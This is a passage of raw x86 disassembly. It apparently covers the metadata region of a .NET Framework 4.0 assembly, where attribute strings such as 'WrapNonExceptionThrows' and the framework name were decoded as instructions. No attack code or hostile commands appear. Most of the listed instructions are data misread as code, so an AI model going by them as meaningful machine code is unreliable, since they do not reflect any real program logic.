  40c0d3:	04 00                	add    $0x0,%al
  40c0d5:	01 0e                	add    %ecx,(%esi)
  40c0d7:	0e                   	push   %cs
  40c0d8:	08 b0 3f 5f 7f 11    	or     %dh,0x117f5f3f(%eax)
  40c0de:	d5 0a                	aad    $0xa
  40c0e0:	3a 06                	cmp    (%esi),%al
  40c0e2:	00 01                	add    %al,(%ecx)
  40c0e4:	12 29                	adc    (%ecx),%ch
  40c0e6:	12 2d 03 06 12 31    	adc    0x31120603,%ch
  40c0ec:	03 00                	add    (%eax),%eax
  40c0ee:	00 18                	add    %bl,(%eax)
  40c0f0:	07                   	pop    %es
  40c0f1:	00 03                	add    %al,(%ebx)
  40c0f3:	08 18                	or     %bl,(%eax)
  40c0f5:	12 35 08 04 00 01    	adc    0x1000408,%dh
  40c0fb:	18 0e                	sbb    %cl,(%esi)
  40c0fd:	06                   	push   %es
  40c0fe:	00 02                	add    %al,(%edx)
  40c100:	02 18                	add    (%eax),%bl
  40c102:	10 02                	adc    %al,(%edx)
  40c104:	06                   	push   %es
  40c105:	00 01                	add    %al,(%ecx)
  40c107:	11 30                	adc    %esi,(%eax)
  40c109:	11 30                	adc    %esi,(%eax)
  40c10b:	06                   	push   %es
  40c10c:	00 03                	add    %al,(%ebx)
  40c10e:	01 09                	add    %ecx,(%ecx)
  40c110:	09 09                	or     %ecx,(%ecx)
  40c112:	02 06                	add    (%esi),%al
  40c114:	09 03                	or     %eax,(%ebx)
  40c116:	06                   	push   %es
  40c117:	11 30                	adc    %esi,(%eax)
  40c119:	04 00                	add    $0x0,%al
  40c11b:	00 00                	add    %al,(%eax)
  40c11d:	80 04 02 00          	addb   $0x0,(%edx,%eax,1)
  40c121:	00 00                	add    %al,(%eax)
  40c123:	04 01                	add    $0x1,%al
  40c125:	00 00                	add    %al,(%eax)
  40c127:	00 06                	add    %al,(%esi)
  40c129:	00 02                	add    %al,(%edx)
  40c12b:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40c12e:	3d 06 00 02 02       	cmp    $0x2020006,%eax
  40c133:	0e                   	push   %cs
  40c134:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40c139:	1d 05 0e 07 06       	sbb    $0x6070e05,%eax
  40c13e:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c143:	60                   	pusha
  40c144:	05 00 01 01 12       	add    $0x12010100,%eax
  40c149:	60                   	pusha
  40c14a:	04 00                	add    $0x0,%al
  40c14c:	01 01                	add    %eax,(%ecx)
  40c14e:	0e                   	push   %cs
  40c14f:	18 06                	sbb    %al,(%esi)
  40c151:	15 12 45 01 15       	adc    $0x15014512,%eax
  40c156:	12 49 0a             	adc    0xa(%ecx),%cl
  40c159:	12 4d 1c             	adc    0x1c(%ebp),%cl
  40c15c:	12 0d 12 09 0e 1d    	adc    0x1d0e0912,%cl
  40c162:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c167:	0e                   	push   %cs
  40c168:	04 20                	add    $0x20,%al
  40c16a:	00 00                	add    %al,(%eax)
  40c16c:	00 04 40             	add    %al,(%eax,%eax,2)
  40c16f:	00 00                	add    %al,(%eax)
  40c171:	00 04 10             	add    %al,(%eax,%edx,1)
  40c174:	00 00                	add    %al,(%eax)
  40c176:	00 04 20             	add    %al,(%eax,%eiz,1)
  40c179:	01 01                	add    %eax,(%ecx)
  40c17b:	0e                   	push   %cs
  40c17c:	04 20                	add    $0x20,%al
  40c17e:	01 0e                	add    %ecx,(%esi)
  40c180:	0e                   	push   %cs
  40c181:	06                   	push   %es
  40c182:	20 01                	and    %al,(%ecx)
  40c184:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  40c189:	20 02                	and    %al,(%edx)
  40c18b:	02 1d 05 1d 05 06    	add    0x6051d05,%bl
  40c191:	00 01                	add    %al,(%ecx)
  40c193:	1d 05 1d 05 03       	sbb    $0x3051d05,%eax
  40c198:	06                   	push   %es
  40c199:	11 50 03             	adc    %edx,0x3(%eax)
  40c19c:	06                   	push   %es
  40c19d:	12 55 05             	adc    0x5(%ebp),%dl
  40c1a0:	00 01                	add    %al,(%ecx)
  40c1a2:	0e                   	push   %cs
  40c1a3:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40c1a8:	1d 05 0a 05 00       	sbb    $0x50a05,%eax
  40c1ad:	01 1d 05 08 05 00    	add    %ebx,0x50805
  40c1b3:	01 1d 05 06 05 00    	add    %ebx,0x50605
  40c1b9:	01 1d 05 0d 09 20    	add    %ebx,0x20090d05
  40c1bf:	01 01                	add    %eax,(%ecx)
  40c1c1:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c1c6:	60                   	pusha
  40c1c7:	03 20                	add    (%eax),%esp
  40c1c9:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40c1cc:	20 00                	and    %al,(%eax)
  40c1ce:	02 03                	add    (%ebx),%al
  40c1d0:	28 00                	sub    %al,(%eax)
  40c1d2:	1c 03                	sbb    $0x3,%al
  40c1d4:	06                   	push   %es
  40c1d5:	12 60 0b             	adc    0xb(%eax),%ah
  40c1d8:	20 02                	and    %al,(%edx)
  40c1da:	01 12                	add    %edx,(%edx)
  40c1dc:	60                   	pusha
  40c1dd:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c1e2:	60                   	pusha
  40c1e3:	04 20                	add    $0x20,%al
  40c1e5:	00 12                	add    %dl,(%edx)
  40c1e7:	60                   	pusha
  40c1e8:	05 20 01 12 60       	add    $0x60120120,%eax
  40c1ed:	0e                   	push   %cs
  40c1ee:	05 20 01 12 60       	add    $0x60120120,%eax
  40c1f3:	0a 05 20 01 12 60    	or     0x60120120,%al
  40c1f9:	0d 05 20 01 12       	or     $0x12012005,%eax
  40c1fe:	60                   	pusha
  40c1ff:	08 03                	or     %al,(%ebx)
  40c201:	20 00                	and    %al,(%eax)
  40c203:	08 05 28 01 12 60    	or     %al,0x60120128
  40c209:	08 03                	or     %al,(%ebx)
  40c20b:	28 00                	sub    %al,(%eax)
  40c20d:	08 03                	or     %al,(%ebx)
  40c20f:	06                   	push   %es
  40c210:	11 64 03 06          	adc    %esp,0x6(%ebx,%eax,1)
  40c214:	12 5c 04 20          	adc    0x20(%esp,%eax,1),%bl
  40c218:	01 08                	add    %ecx,(%eax)
  40c21a:	0e                   	push   %cs
  40c21b:	05 20 01 01 12       	add    $0x12010120,%eax
  40c220:	61                   	popa
  40c221:	04 20                	add    $0x20,%al
  40c223:	01 01                	add    %eax,(%ecx)
  40c225:	0a 04 20             	or     (%eax,%eiz,1),%al
  40c228:	01 01                	add    %eax,(%ecx)
  40c22a:	0b 03                	or     (%ebx),%eax
  40c22c:	20 00                	and    %al,(%eax)
  40c22e:	0b 03                	or     (%ebx),%eax
  40c230:	20 00                	and    %al,(%eax)
  40c232:	0a 03                	or     (%ebx),%al
  40c234:	20 00                	and    %al,(%eax)
  40c236:	0d 05 20 01 01       	or     $0x1012005,%eax
  40c23b:	1d 05 04 20 00       	sbb    $0x200405,%eax
  40c240:	1d 05 05 20 02       	sbb    $0x2200505,%eax
  40c245:	01 0e                	add    %ecx,(%esi)
  40c247:	0e                   	push   %cs
  40c248:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c24d:	08 04 20             	or     %al,(%eax,%eiz,1)
  40c250:	01 02                	add    %eax,(%edx)
  40c252:	0e                   	push   %cs
  40c253:	03 20                	add    (%eax),%esp
  40c255:	00 0e                	add    %cl,(%esi)
  40c257:	04 20                	add    $0x20,%al
  40c259:	01 01                	add    %eax,(%ecx)
  40c25b:	02 04 20             	add    (%eax,%eiz,1),%al
  40c25e:	01 01                	add    %eax,(%ecx)
  40c260:	0c 04                	or     $0x4,%al
  40c262:	20 01                	and    %al,(%ecx)
  40c264:	01 0d 04 20 00 12    	add    %ecx,0x12002004
  40c26a:	5c                   	pop    %esp
  40c26b:	04 20                	add    $0x20,%al
  40c26d:	00 11                	add    %dl,(%ecx)
  40c26f:	64 04 20             	fs add $0x20,%al
  40c272:	00 12                	add    %dl,(%edx)
  40c274:	59                   	pop    %ecx
  40c275:	03 28                	add    (%eax),%ebp
  40c277:	00 0e                	add    %cl,(%esi)
  40c279:	03 28                	add    (%eax),%ebp
  40c27b:	00 0a                	add    %cl,(%edx)
  40c27d:	03 28                	add    (%eax),%ebp
  40c27f:	00 0d 04 28 00 12    	add    %cl,0x12002804
  40c285:	5c                   	pop    %esp
  40c286:	04 28                	add    $0x28,%al
  40c288:	00 11                	add    %dl,(%ecx)
  40c28a:	64 04 00             	fs add $0x0,%al
  40c28d:	00 00                	add    %al,(%eax)
  40c28f:	00 04 03             	add    %al,(%ebx,%eax,1)
  40c292:	00 00                	add    %al,(%eax)
  40c294:	00 04 04             	add    %al,(%esp,%eax,1)
  40c297:	00 00                	add    %al,(%eax)
  40c299:	00 04 05 00 00 00 04 	add    %al,0x4000000(,%eax,1)
  40c2a0:	06                   	push   %es
  40c2a1:	00 00                	add    %al,(%eax)
  40c2a3:	00 04 07             	add    %al,(%edi,%eax,1)
  40c2a6:	00 00                	add    %al,(%eax)
  40c2a8:	00 04 08             	add    %al,(%eax,%ecx,1)
  40c2ab:	00 00                	add    %al,(%eax)
  40c2ad:	00 04 09             	add    %al,(%ecx,%ecx,1)
  40c2b0:	00 00                	add    %al,(%eax)
  40c2b2:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c2b5:	00 00                	add    %al,(%eax)
  40c2b7:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  40c2ba:	00 00                	add    %al,(%eax)
  40c2bc:	00 06                	add    %al,(%esi)
  40c2be:	00 02                	add    %al,(%edx)
  40c2c0:	0e                   	push   %cs
  40c2c1:	12 61 08             	adc    0x8(%ecx),%ah
  40c2c4:	05 00 01 0e 12       	add    $0x120e0100,%eax
  40c2c9:	61                   	popa
  40c2ca:	06                   	push   %es
  40c2cb:	00 02                	add    %al,(%edx)
  40c2cd:	0e                   	push   %cs
  40c2ce:	05 12 61 05 00       	add    $0x56112,%eax
  40c2d3:	01 01                	add    %eax,(%ecx)
  40c2d5:	12 61 06             	adc    0x6(%ecx),%ah
  40c2d8:	00 02                	add    %al,(%edx)
  40c2da:	01 12                	add    %edx,(%edx)
  40c2dc:	61                   	popa
  40c2dd:	0e                   	push   %cs
  40c2de:	07                   	pop    %es
  40c2df:	00 02                	add    %al,(%edx)
  40c2e1:	01 12                	add    %edx,(%edx)
  40c2e3:	61                   	popa
  40c2e4:	1d 05 06 00 02       	sbb    $0x2000605,%eax
  40c2e9:	01 12                	add    %edx,(%edx)
  40c2eb:	61                   	popa
  40c2ec:	0d 06 00 02 01       	or     $0x1020006,%eax
  40c2f1:	12 61 0c             	adc    0xc(%ecx),%ah
  40c2f4:	06                   	push   %es
  40c2f5:	00 02                	add    %al,(%edx)
  40c2f7:	01 12                	add    %edx,(%edx)
  40c2f9:	61                   	popa
  40c2fa:	02 06                	add    (%esi),%al
  40c2fc:	00 02                	add    %al,(%edx)
  40c2fe:	01 12                	add    %edx,(%edx)
  40c300:	61                   	popa
  40c301:	0b 06                	or     (%esi),%eax
  40c303:	00 02                	add    %al,(%edx)
  40c305:	01 12                	add    %edx,(%edx)
  40c307:	61                   	popa
  40c308:	0a 03                	or     (%ebx),%al
  40c30a:	06                   	push   %es
  40c30b:	11 78 04             	adc    %edi,0x4(%eax)
  40c30e:	20 01                	and    %al,(%ecx)
  40c310:	01 08                	add    %ecx,(%eax)
  40c312:	08 01                	or     %al,(%ecx)
  40c314:	00 08                	add    %cl,(%eax)
  40c316:	00 00                	add    %al,(%eax)
  40c318:	00 00                	add    %al,(%eax)
  40c31a:	00 1e                	add    %bl,(%esi)
  40c31c:	01 00                	add    %eax,(%eax)
  40c31e:	01 00                	add    %eax,(%eax)
  40c320:	54                   	push   %esp
  40c321:	02 16                	add    (%esi),%dl
  40c323:	57                   	push   %edi
  40c324:	72 61                	jb     0x40c387
  40c326:	70 4e                	jo     0x40c376
  40c328:	6f                   	outsl  %ds:(%esi),(%dx)
  40c329:	6e                   	outsb  %ds:(%esi),(%dx)
  40c32a:	45                   	inc    %ebp
  40c32b:	78 63                	js     0x40c390
  40c32d:	65 70 74             	gs jo  0x40c3a4
  40c330:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40c337:	77 73                	ja     0x40c3ac
  40c339:	01 05 20 01 01 11    	add    %eax,0x11010120
  40c33f:	71 08                	jno    0x40c349
  40c341:	01 00                	add    %eax,(%eax)
  40c343:	02 00                	add    (%eax),%al
  40c345:	00 00                	add    %al,(%eax)
  40c347:	00 00                	add    %al,(%eax)
  40c349:	05 01 00 00 00       	add    $0x1,%eax
  40c34e:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40c351:	00 07                	add    %al,(%edi)
  40c353:	31 2e                	xor    %ebp,(%esi)
  40c355:	30 2e                	xor    %ch,(%esi)
  40c357:	30 2e                	xor    %ch,(%esi)
  40c359:	30 00                	xor    %al,(%eax)
  40c35b:	00 65 01             	add    %ah,0x1(%ebp)
  40c35e:	00 29                	add    %ch,(%ecx)
  40c360:	2e 4e                	cs dec %esi
  40c362:	45                   	inc    %ebp
  40c363:	54                   	push   %esp
  40c364:	46                   	inc    %esi
  40c365:	72 61                	jb     0x40c3c8
  40c367:	6d                   	insl   (%dx),%es:(%edi)
  40c368:	65 77 6f             	gs ja  0x40c3da
  40c36b:	72 6b                	jb     0x40c3d8
  40c36d:	2c 56                	sub    $0x56,%al
  40c36f:	65 72 73             	gs jb  0x40c3e5
  40c372:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40c379:	30 2c 50             	xor    %ch,(%eax,%edx,2)
  40c37c:	72 6f                	jb     0x40c3ed
  40c37e:	66 69 6c 65 3d 43 6c 	imul   $0x6c43,0x3d(%ebp,%eiz,2),%bp
  40c385:	69 65 6e 74 01 00 54 	imul   $0x54000174,0x6e(%ebp),%esp
  40c38c:	0e                   	push   %cs
  40c38d:	14 46                	adc    $0x46,%al
  40c38f:	72 61                	jb     0x40c3f2
  40c391:	6d                   	insl   (%dx),%es:(%edi)
  40c392:	65 77 6f             	gs ja  0x40c404
  40c395:	72 6b                	jb     0x40c402
  40c397:	44                   	inc    %esp
  40c398:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40c39f:	61                   	popa
  40c3a0:	6d                   	insl   (%dx),%es:(%edi)
  40c3a1:	65 1f                	gs pop %ds
  40c3a3:	2e 4e                	cs dec %esi
  40c3a5:	45                   	inc    %ebp
  40c3a6:	54                   	push   %esp
  40c3a7:	20 46 72             	and    %al,0x72(%esi)
  40c3aa:	61                   	popa
  40c3ab:	6d                   	insl   (%dx),%es:(%edi)
  40c3ac:	65 77 6f             	gs ja  0x40c41e
  40c3af:	72 6b                	jb     0x40c41c
  40c3b1:	20 34 20             	and    %dh,(%eax,%eiz,1)
  40c3b4:	43                   	inc    %ebx
  40c3b5:	6c                   	insb   (%dx),%es:(%edi)
  40c3b6:	69 65 6e 74 20 50 72 	imul   $0x72502074,0x6e(%ebp),%esp
  40c3bd:	6f                   	outsl  %ds:(%esi),(%dx)
  40c3be:	66 69 6c 65 09 01 00 	imul   $0x1,0x9(%ebp,%eiz,2),%bp
  40c3c5:	04 49                	add    $0x49,%al
  40c3c7:	74 65                	je     0x40c42e
  40c3c9:	6d                   	insl   (%dx),%es:(%edi)
  40c3ca:	00 00                	add    %al,(%eax)
  40c3cc:	03 07                	add    (%edi),%eax
  40c3ce:	01 08                	add    %ecx,(%eax)
  40c3d0:	04 00                	add    $0x0,%al
  40c3d2:	01 08                	add    %ecx,(%eax)
  40c3d4:	0e                   	push   %cs
  40c3d5:	03 07                	add    (%edi),%eax
  40c3d7:	01 02                	add    %eax,(%edx)
  40c3d9:	05 00 00 12 80       	add    $0x80120000,%eax
  40c3de:	b1 05                	mov    $0x5,%cl
  40c3e0:	20 01                	and    %al,(%ecx)
  40c3e2:	0e                   	push   %cs
  40c3e3:	1d 05 05 20 00       	sbb    $0x200505,%eax
  40c3e8:	12 80 b5 05 20 00    	adc    0x2005b5(%eax),%al
  40c3ee:	12 80 b9 05 20 01    	adc    0x12005b9(%eax),%al
  40c3f4:	1d 05 0e 08 20       	sbb    $0x20080e05,%eax
  40c3f9:	03 02                	add    (%edx),%eax
  40c3fb:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  40c400:	14 07                	adc    $0x7,%al
  40c402:	08 0e                	or     %cl,(%esi)
  40c404:	08 1d 12 80 c9 08    	or     %bl,0x8c98012
  40c40a:	12 80 c9 12 80 cd    	adc    -0x327fed37(%eax),%al
  40c410:	12 80 d1 1d 0e 0c    	adc    0xc0e1dd1(%eax),%al
  40c416:	20 03                	and    %al,(%ebx)
  40c418:	01 11                	add    %edx,(%ecx)
  40c41a:	80 d5 11             	adc    $0x11,%ch
  40c41d:	80 d9 11             	sbb    $0x11,%cl
  40c420:	80 dd 05             	sbb    $0x5,%ch
  40c423:	00 02                	add    %al,(%edx)
  40c425:	02 0e                	add    (%esi),%cl
  40c427:	0e                   	push   %cs
  40c428:	06                   	push   %es
  40c429:	20 01                	and    %al,(%ecx)
  40c42b:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  40c430:	20 01                	and    %al,(%ecx)
  40c432:	08 08                	or     %cl,(%eax)
  40c434:	07                   	pop    %es
  40c435:	00 01                	add    %al,(%ecx)
  40c437:	1d 12 80 c9 0e       	sbb    $0xec98012,%eax
  40c43c:	07                   	pop    %es
  40c43d:	20 02                	and    %al,(%edx)
  40c43f:	01 12                	add    %edx,(%edx)
  40c441:	80 c9 08             	or     $0x8,%cl
  40c444:	06                   	push   %es
  40c445:	20 01                	and    %al,(%ecx)
  40c447:	01 12                	add    %edx,(%edx)
  40c449:	80 f1 09             	xor    $0x9,%cl
  40c44c:	20 02                	and    %al,(%edx)
  40c44e:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  40c453:	80 f5 05             	xor    $0x5,%ch
  40c456:	20 02                	and    %al,(%edx)
  40c458:	08 08                	or     %cl,(%eax)
  40c45a:	08 06                	or     %al,(%esi)
  40c45c:	20 02                	and    %al,(%edx)
  40c45e:	01 12                	add    %edx,(%edx)
  40c460:	0d 02 05 20 02       	or     $0x2200502,%eax
  40c465:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40c468:	09 20                	or     %esp,(%eax)
  40c46a:	03 01                	add    (%ecx),%eax
  40c46c:	12 61 02             	adc    0x2(%ecx),%ah
  40c46f:	12 81 01 05 20 00    	adc    0x200501(%ecx),%al
  40c475:	12 81 05 0b 20 04    	adc    0x4200b05(%ecx),%al
  40c47b:	01 0e                	add    %ecx,(%esi)
  40c47d:	12 81 09 11 81 0d    	adc    0xd811109(%ecx),%al
  40c483:	02 09                	add    (%ecx),%cl
  40c485:	20 04 01             	and    %al,(%ecx,%eax,1)
  40c488:	12 81 15 1c 08 08    	adc    0x8081c15(%ecx),%al
  40c48e:	0c 20                	or     $0x20,%al
  40c490:	05 12 25 1d 05       	add    $0x51d2512,%eax
  40c495:	08 08                	or     %cl,(%eax)
  40c497:	12 81 19 1c 06 00    	adc    0x61c19(%ecx),%al
  40c49d:	01 11                	add    %edx,(%ecx)
  40c49f:	81 21 0e 05 20 01    	andl   $0x120050e,(%ecx)
  40c4a5:	02 12                	add    (%edx),%dl
  40c4a7:	19 04 07             	sbb    %eax,(%edi,%eax,1)
  40c4aa:	02 08                	add    (%eax),%cl
  40c4ac:	08 05 20 01 08 12    	or     %al,0x12080120
  40c4b2:	25 06 00 02 08       	and    $0x8020006,%eax
  40c4b7:	1d 05 08 07 20       	sbb    $0x20070805,%eax
  40c4bc:	03 08                	add    (%eax),%ecx
  40c4be:	1d 05 08 08 06       	sbb    $0x6080805,%eax
  40c4c3:	20 01                	and    %al,(%ecx)
  40c4c5:	01 12                	add    %edx,(%edx)
  40c4c7:	81 29 04 20 01 01    	subl   $0x1012004,(%ecx)
  40c4cd:	1c 0c                	sbb    $0xc,%al
  40c4cf:	07                   	pop    %es
  40c4d0:	06                   	push   %es
  40c4d1:	1c 02                	sbb    $0x2,%al
  40c4d3:	1d 05 12 81 2d       	sbb    $0x2d811205,%eax
  40c4d8:	08 1d 05 06 00 02    	or     %bl,0x2000605
  40c4de:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40c4e1:	02 07                	add    (%edi),%al
  40c4e3:	20 02                	and    %al,(%edx)
  40c4e5:	02 08                	add    (%eax),%cl
  40c4e7:	11 81 35 07 20 03    	adc    %eax,0x3200735(%ecx)
  40c4ed:	01 1d 05 08 08 1a    	add    %ebx,0x1a080805
  40c4f3:	07                   	pop    %es
  40c4f4:	0a 12                	or     (%edx),%dl
  40c4f6:	81 3d 0e 1d 12 81 41 	cmpl   $0x81120841,0x81121d0e
  40c4fd:	08 12 81 
  40c500:	41                   	inc    %ecx
  40c501:	12 81 45 12 81 49    	adc    0x49811245(%ecx),%al
  40c507:	1d 05 0e 12 81       	sbb    $0x81120e05,%eax
  40c50c:	4d                   	dec    %ebp
  40c50d:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40c512:	0e                   	push   %cs
  40c513:	05 00 00 12 81       	add    $0x81120000,%eax
  40c518:	41                   	inc    %ecx
  40c519:	05 20 00 12 81       	add    $0x81120020,%eax
  40c51e:	55                   	push   %ebp
  40c51f:	06                   	push   %es
  40c520:	00 00                	add    %al,(%eax)
  40c522:	1d 12 81 41 05       	sbb    $0x5418112,%eax
  40c527:	00 01                	add    %al,(%ecx)
  40c529:	0e                   	push   %cs
  40c52a:	1d 0e 06 20 01       	sbb    $0x120060e,%eax
  40c52f:	01 11                	add    %edx,(%ecx)
  40c531:	81 5d 08 00 01 12 81 	sbbl   $0x81120100,0x8(%ebp)
  40c538:	41                   	inc    %ecx
  40c539:	12 81 45 04 06 12    	adc    0x12060445(%ecx),%al
  40c53f:	81 49 09 20 02 12 81 	orl    $0x81120220,0x9(%ecx)
  40c546:	49                   	dec    %ecx
  40c547:	0e                   	push   %cs
  40c548:	11 81 69 06 00 03    	adc    %eax,0x3000669(%ecx)
  40c54e:	0e                   	push   %cs
  40c54f:	0e                   	push   %cs
  40c550:	0e                   	push   %cs
  40c551:	0e                   	push   %cs
  40c552:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c557:	1c 07                	sbb    $0x7,%al
  40c559:	20 02                	and    %al,(%edx)
  40c55b:	01 0e                	add    %ecx,(%esi)
  40c55d:	11 81 75 04 07 02    	adc    %eax,0x2070475(%ecx)
  40c563:	0a 02                	or     (%edx),%al
  40c565:	10 07                	adc    %al,(%edi)
  40c567:	06                   	push   %es
  40c568:	12 81 85 12 81 89    	adc    -0x767eed7b(%ecx),%al
  40c56e:	12 81 8d 12 81 91    	adc    -0x6e7eed73(%ecx),%al
  40c574:	0e                   	push   %cs
  40c575:	02 05 20 00 12 81    	add    0x81120020,%al
  40c57b:	89 05 20 00 12 81    	mov    %eax,0x81120020
  40c581:	8d 05 20 00 12 81    	lea    0x81120020,%eax
  40c587:	91                   	xchg   %eax,%ecx
  40c588:	04 20                	add    $0x20,%al
  40c58a:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40c58d:	04 07                	add    $0x7,%al
  40c58f:	02 02                	add    (%edx),%al
  40c591:	02 03                	add    (%ebx),%al
  40c593:	20 00                	and    %al,(%eax)
  40c595:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40c598:	02 18                	add    (%eax),%bl
  40c59a:	02 03                	add    (%ebx),%al
  40c59c:	07                   	pop    %es
  40c59d:	01 0e                	add    %ecx,(%esi)
  40c59f:	05 00 00 12 81       	add    $0x81120000,%eax
  40c5a4:	9d                   	popf
  40c5a5:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40c5aa:	1c 0a                	sbb    $0xa,%al
  40c5ac:	07                   	pop    %es
  40c5ad:	05 1d 05 12 35       	add    $0x3512051d,%eax
  40c5b2:	1d 05 08 05 05       	sbb    $0x5050805,%eax
  40c5b7:	20 01                	and    %al,(%ecx)
  40c5b9:	12 35 0e 05 20 02    	adc    0x220050e,%dh
  40c5bf:	0e                   	push   %cs
  40c5c0:	08 08                	or     %cl,(%eax)
  40c5c2:	06                   	push   %es
  40c5c3:	07                   	pop    %es
  40c5c4:	02 02                	add    (%edx),%al
  40c5c6:	11 81 ad 05 20 02    	adc    %eax,0x22005ad(%ecx)
  40c5cc:	0e                   	push   %cs
  40c5cd:	0e                   	push   %cs
  40c5ce:	0e                   	push   %cs
  40c5cf:	05 20 00 11 81       	add    $0x81110020,%eax
  40c5d4:	ad                   	lods   %ds:(%esi),%eax
  40c5d5:	05 00 00 12 81       	add    $0x81120000,%eax
  40c5da:	b9 06 20 01 01       	mov    $0x1012006,%ecx
  40c5df:	12 81 b9 06 20 01    	adc    0x12006b9(%ecx),%al
  40c5e5:	02 11                	add    (%ecx),%dl
  40c5e7:	81 c1 11 07 05 12    	add    $0x12050711,%ecx
  40c5ed:	81 85 15 12 41 01 0e 	addl   $0x8d81120e,0x1411215(%ebp)
  40c5f4:	12 81 8d 
  40c5f7:	12 81 91 0e 05 15    	adc    0x15050e91(%ecx),%al
  40c5fd:	12 41 01             	adc    0x1(%ecx),%al
  40c600:	0e                   	push   %cs
  40c601:	05 20 01 01 13       	add    $0x13010120,%eax
  40c606:	00 05 20 00 1d 13    	add    %al,0x131d0020
  40c60c:	00 06                	add    %al,(%esi)
  40c60e:	00 02                	add    %al,(%edx)
  40c610:	0e                   	push   %cs
  40c611:	0e                   	push   %cs
  40c612:	1d 0e 08 07 03       	sbb    $0x307080e,%eax
  40c617:	1d 12 29 08 12       	sbb    $0x12082912,%eax
  40c61c:	29 05 00 00 1d 12    	sub    %eax,0x121d0000
  40c622:	29 05 20 00 11 81    	sub    %eax,0x81110020
  40c628:	c5 09                	lds    (%ecx),%ecx
  40c62a:	00 02                	add    %al,(%edx)
  40c62c:	02 11                	add    (%ecx),%dl
  40c62e:	81 c5 11 81 c5 05    	add    $0x5c58111,%ebp
  40c634:	07                   	pop    %es
  40c635:	02 12                	add    (%edx),%dl
  40c637:	35 0e 07 20 03       	xor    $0x320070e,%eax
  40c63c:	01 02                	add    %eax,(%edx)
  40c63e:	0e                   	push   %cs
  40c63f:	10 02                	adc    %al,(%edx)
  40c641:	06                   	push   %es
  40c642:	00 01                	add    %al,(%ecx)
  40c644:	01 12                	add    %edx,(%edx)
  40c646:	81 cd 06 07 02 12    	or     $0x12020706,%ebp
  40c64c:	81 49 02 08 20 03 01 	orl    $0x1032008,0x2(%ecx)
  40c653:	0e                   	push   %cs
  40c654:	1c 11                	sbb    $0x11,%al
  40c656:	81 d5 07 07 02 12    	adc    $0x12020707,%ebp
  40c65c:	81 49 1d 05 06 20 01 	orl    $0x1200605,0x1d(%ecx)
  40c663:	12 81 49 0e 02 1d    	adc    0x1d020e49(%ecx),%al
  40c669:	05 07 20 02 12       	add    $0x12022007,%eax
  40c66e:	81 49 0e 02 0e 07 04 	orl    $0x4070e02,0xe(%ecx)
  40c675:	12 60 0e             	adc    0xe(%eax),%ah
  40c678:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40c67d:	12 60 12             	adc    0x12(%eax),%ah
  40c680:	60                   	pusha
  40c681:	06                   	push   %es
  40c682:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c687:	60                   	pusha
  40c688:	10 10                	adc    %dl,(%eax)
  40c68a:	01 01                	add    %eax,(%ecx)
  40c68c:	15 12 41 01 1e       	adc    $0x1e014112,%eax
  40c691:	00 15 12 81 e1 01    	add    %dl,0x1e18112
  40c697:	1e                   	push   %ds
  40c698:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c69b:	01 12                	add    %edx,(%edx)
  40c69d:	60                   	pusha
  40c69e:	09 20                	or     %esp,(%eax)
  40c6a0:	00 15 11 81 d9 01    	add    %dl,0x1d98111
  40c6a6:	13 00                	adc    (%eax),%eax
  40c6a8:	07                   	pop    %es
  40c6a9:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40c6ae:	12 60 04             	adc    0x4(%eax),%ah
  40c6b1:	20 00                	and    %al,(%eax)
  40c6b3:	13 00                	adc    (%eax),%eax
  40c6b5:	05 20 01 02 13       	add    $0x13020120,%eax
  40c6ba:	00 03                	add    %al,(%ebx)
  40c6bc:	07                   	pop    %es
  40c6bd:	01 1c 05 00 00 12 81 	add    %ebx,-0x7eee0000(,%eax,1)
  40c6c4:	e5 07                	in     $0x7,%eax
  40c6c6:	20 01                	and    %al,(%ecx)
  40c6c8:	12 81 e9 1d 05 06    	adc    0x6051de9(%ecx),%al
  40c6ce:	20 01                	and    %al,(%ecx)
  40c6d0:	12 81 ed 0e 06 00    	adc    0x60eed(%ecx),%al
  40c6d6:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40c6d9:	81 ed 08 00 01 12    	sub    $0x12010008,%ebp
  40c6df:	81 ed 11 81 f5 09    	sub    $0x9f58111,%ebp
  40c6e5:	00 02                	add    %al,(%edx)
  40c6e7:	12 81 f9 11 81 fd    	adc    -0x27eee07(%ecx),%al
  40c6ed:	0e                   	push   %cs
  40c6ee:	1c 00                	sbb    $0x0,%al
  40c6f0:	05 12 82 05 11       	add    $0x11058212,%eax
  40c6f5:	82 09 0e             	orb    $0xe,(%ecx)
  40c6f8:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40c6fd:	12 81 ed 12 81 ed    	adc    -0x127eed13(%ecx),%al
  40c703:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40c708:	12 81 f9 17 15 12    	adc    0x121517f9(%ecx),%al
  40c70e:	45                   	inc    %ebp
  40c70f:	01 15 12 49 0a 12    	add    %edx,0x120a4912
